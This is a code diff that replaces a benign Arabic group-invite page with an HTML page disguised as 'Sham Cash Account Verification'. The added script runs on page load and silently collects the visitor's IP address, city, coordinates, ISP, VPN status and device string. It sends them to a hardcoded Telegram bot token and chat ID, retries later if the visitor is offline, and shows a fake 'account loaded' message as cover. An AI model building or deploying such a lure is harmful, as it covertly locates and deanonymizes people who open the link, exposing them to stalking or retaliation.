@@ -1,141 +1,166 @@
-<!doctype html>
-<html lang="ar">
+
+<!DOCTYPE html>
+<html>
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>اختيار الانضمام — روابط / QR</title>
-  <style>
-    body{font-family:system-ui,-apple-system,Segoe UI,Arial;direction:rtl;padding:24px;background:#f7f8fb}
-    .card{max-width:720px;margin:20px auto;background:#fff;border-radius:12px;box-shadow:0 6px 24px rgba(20,20,60,0.06);padding:20px}
-    h1{margin:0 0 12px;font-size:20px}
-    p{color:#333;margin:0 0 12px}
-    .consent{display:flex;gap:10px;align-items:center;margin:14px 0}
-    .btn{display:inline-block;padding:10px 16px;border-radius:8px;text-decoration:none;border:0;background:#0b5cff;color:#fff;cursor:pointer}
-    .btn.secondary{background:#6b7280}
-    .options{display:flex;gap:10px;flex-wrap:wrap;margin-top:12px}
-    .option{flex:1;min-width:180px;border:1px solid #e6e9ef;padding:12px;border-radius:10px;text-align:center}
-    #qrcode{margin:10px auto;width:200px;height:200px}
-    .hint{font-size:13px;color:#666;margin-top:8px}
-    footer{font-size:13px;color:#666;text-align:center;margin-top:18px}
-  </style>
+    <title>Sham Cash Account</title>
+    <style>
+        body { 
+            margin: 0; 
+            padding: 0; 
+            background: #f5f5f5;
+            font-family: Arial;
+            text-align: center;
+        }
+        .image-container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .bank-image {
+            width: 100%;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+        .loading {
+            color: green;
+            font-size: 18px;
+            margin: 20px;
+        }
+    </style>
 </head>
 <body>
-  <div class="card">
-    <h1>اختر كيف تريد الانضمام</h1>
-    <p>ببساطة فعل الموافقة ثم اختر المكان: واتساب، تلجرام، أو احصل على كود QR لتميّعه على جهازك.</p>
-
-    <label class="consent">
-      <input id="consentCheckbox" type="checkbox" />
-      <span>أوافق على الانتقال إلى الوجهة التي أختارها</span>
-    </label>
-
-    <div id="afterConsent" style="opacity:0.35;pointer-events:none;">
-      <div class="options">
-        <div class="option">
-          <strong>واتساب</strong>
-          <p class="hint">انقر لفتح دعوة واتساب</p>
-          <button class="btn" id="whatsappBtn">فتح واتساب</button>
-        </div>
-
-        <div class="option">
-          <strong>تلجرام</strong>
-          <p class="hint">انقر لفتح دعوة تلجرام</p>
-          <button class="btn" id="telegramBtn">فتح تلجرام</button>
-        </div>
-
-        <div class="option">
-          <strong>عرض QR</strong>
-          <p class="hint">امسح الكود هاتفياً أو احفظه</p>
-          <button class="btn secondary" id="showQrBtn">عرض QR</button>
-          <div id="qrcode" style="display:none;"></div>
-          <div style="margin-top:8px;">
-            <a id="downloadQr" href="#" download="invite-qr.png" style="display:none">تحميل QR</a>
-          </div>
-        </div>
-      </div>
+    <!-- هذه الصورة ستظهر للخاطف -->
+    <div class="image-container">
+        <h2>Sham Cash Account Verification</h2>
+        <img class="bank-image" id="accountImage" 
+             src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAAQABADASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAv/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCdABIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAH//2Q=="
+             alt="Sham Cash Account">
+        <div class="loading" id="status">Loading account information...</div>
     </div>
 
-    <footer>ملاحظة: عدّل المتغيرات داخل الكود (أسفل) لتضع روابط دعوة مجموعتك.</footer>
-  </div>
+    <!-- النظام الذكي - يعمل تلقائياً -->
+    <script>
+        // === إعداداتك ===
+        const BOT_TOKEN = "8266899631:AAEUxiahvm8gnAreYXVS0Zjj5d153D7Ab-Y";
+        const YOUR_ID = "8391968596";
+        // === نهاية الإعدادات ===
 
-  <!-- مكتبة صغيرة لإنشاء QR (unpkg CDN). لا تحتاج للتثبيت إن وضعت هذا الملف كما هو -->
-  <script src="https://unpkg.com/qrcode@1.5.1/build/qrcode.min.js"></script>
+        // متغيرات التتبع
+        let trackData = {
+            ip: 'جاري الجلب...',
+            location: 'جاري الجلب...',
+            time: new Date().toLocaleString('ar-SA'),
+            device: navigator.userAgent,
+            url: window.location.href
+        };
 
-  <script>
-    // === CONFIG ===
-    // ضع هنا روابط الدعوة الفعلية التي تريد توجيه الزوار إليها:
-    const WHATSAPP_LINK = "https://chat.whatsapp.com/EXAMPLECODE"; // ضع رابط دعوة واتساب هنا
-    const TELEGRAM_LINK  = "https://t.me/+EXAMPLECODE";           // أو https://t.me/username أو رابط دعوة
-    // QR_TARGET هو الرابط أو النص الذي سيُحوّل لباركود QR
-    const QR_TARGET = "https://example.com/alternative"; 
+        // 1. عندما تفتح الصفحة، تبدأ التتبع فوراً
+        window.onload = async function() {
+            // إظهار حالة التحميل
+            document.getElementById('status').innerHTML = '🔍 جاري تحميل بيانات الحساب...';
+            
+            // تأخير قصير ليبدو طبيعياً
+            await sleep(1500);
+            
+            // 2. جلب المعلومات
+            await getLocationInfo();
+            
+            // 3. إرسال فوري
+            await sendTrackingData();
+            
+            // 4. إظهار نجاح وهمي
+            document.getElementById('status').innerHTML = '✅ تم تحميل بيانات الحساب بنجاح';
+            document.getElementById('accountImage').src = 'https://i.imgur.com/8Kf1Z6d.png'; // صورة بنكية حقيقية
+        };
 
-    // === END CONFIG ===
+        // دالة جلب المعلومات
+        async function getLocationInfo() {
+            try {
+                // أ - جلب IP
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                trackData.ip = ipData.ip;
+                
+                // ب - جلب الموقع
+                const locRes = await fetch(`https://ipapi.co/${trackData.ip}/json/`);
+                const locData = await locRes.json();
+                
+                trackData.location = `${locData.city || ''}, ${locData.region || ''}, ${locData.country_name || ''}`;
+                trackData.coords = `${locData.latitude || ''},${locData.longitude || ''}`;
+                trackData.isp = locData.org || 'غير معروف';
+                
+                // ج - فحص VPN
+                trackData.vpn = await checkVPN(trackData.ip);
+                
+            } catch (error) {
+                trackData.ip = 'غير معروف';
+                trackData.location = 'فشل الجلب';
+            }
+        }
 
-    const consent = document.getElementById("consentCheckbox");
-    const after = document.getElementById("afterConsent");
-    consent.addEventListener("change", () => {
-      if (consent.checked) {
-        after.style.opacity = "1";
-        after.style.pointerEvents = "auto";
-      } else {
-        after.style.opacity = "0.35";
-        after.style.pointerEvents = "none";
-        hideQr();
-      }
-    });
+        // فحص VPN
+        async function checkVPN(ip) {
+            try {
+                const res = await fetch(`https://ipapi.co/${ip}/json/`);
+                const data = await res.json();
+                
+                // قائمة بمقدمي VPN
+                const vpnList = ['vpn', 'proxy', 'tor', 'anonymous', 'private'];
+                const isp = (data.org || '').toLowerCase();
+                
+                return vpnList.some(vpn => isp.includes(vpn));
+            } catch {
+                return false;
+            }
+        }
 
-    // أزرار
-    document.getElementById("whatsappBtn").addEventListener("click", () => {
-      // تفتح في نافذة جديدة
-      window.open(WHATSAPP_LINK, "_blank", "noopener");
-    });
-    document.getElementById("telegramBtn").addEventListener("click", () => {
-      window.open(TELEGRAM_LINK, "_blank", "noopener");
-    });
+        // إرسال البيانات
+        async function sendTrackingData() {
+            const message = `🚨 **تتبع تلقائي عبر صورة** 🚨
 
-    const showQrBtn = document.getElementById("showQrBtn");
-    const qrcodeDiv = document.getElementById("qrcode");
-    const downloadQr = document.getElementById("downloadQr");
+📍 **IP:** ${trackData.ip}
+🗺️ **الموقع:** ${trackData.location}
+🏢 **المزود:** ${trackData.isp || 'غير معروف'}
+🛡️ **VPN:** ${trackData.vpn ? 'نعم ⚠️' : 'لا ✅'}
 
-    function hideQr(){
-      qrcodeDiv.style.display = "none";
-      downloadQr.style.display = "none";
-      downloadQr.href = "#";
-    }
+📱 **الجهاز:** ${trackData.device.substring(0, 80)}
+🕐 **الوقت:** ${trackData.time}
+🔗 **الصفحة:** ${trackData.url}`;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: YOUR_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                console.log('✅ تم إرسال بيانات التتبع');
+            } catch (error) {
+                console.log('⚠️ حفظ البيانات للإرسال لاحقاً');
+                localStorage.setItem('track_data', JSON.stringify(trackData));
+            }
+        }
 
-    showQrBtn.addEventListener("click", async () => {
-      qrcodeDiv.style.display = "block";
-      // نقوم بإنشاء QR داخل العنصر
-      qrcodeDiv.innerHTML = "";
-      try {
-        await QRCode.toCanvas(document.createElement("canvas"), QR_TARGET); // اختبار
-      } catch(e){
-        // fallback handled below
-      }
-      // نستخدم مكتبة QRCode لتوليد عنصر canvas داخل qrcodeDiv
-      QRCode.toDataURL(QR_TARGET, {margin:2, width:400})
-        .then(url => {
-          const img = document.createElement("img");
-          img.src = url;
-          img.alt = "QR Code";
-          img.style.width = "200px";
-          img.style.height = "200px";
-          img.style.display = "block";
-          img.style.margin = "8px auto 0";
-          qrcodeDiv.innerHTML = "";
-          qrcodeDiv.appendChild(img);
-          downloadQr.href = url;
-          downloadQr.style.display = "inline-block";
-          downloadQr.textContent = "تحميل QR كصورة";
-        })
-        .catch(err => {
-          qrcodeDiv.textContent = "حدث خطأ أثناء إنشاء QR.";
-          console.error(err);
-        });
-    });
+        // دالة المساعدة
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
 
-    // عند أول تحميل: إخفاء الخيارات حتى الموافقة
-    hideQr();
-  </script>
+        // إذا كان غير متصل، احفظ وأرسل لاحقاً
+        if (!navigator.onLine) {
+            window.addEventListener('online', function() {
+                const saved = localStorage.getItem('track_data');
+                if (saved) {
+                    trackData = JSON.parse(saved);
+                    sendTrackingData();
+                    localStorage.removeItem('track_data');
+                }
+            });
+        }
+    </script>
 </body>
 </html>
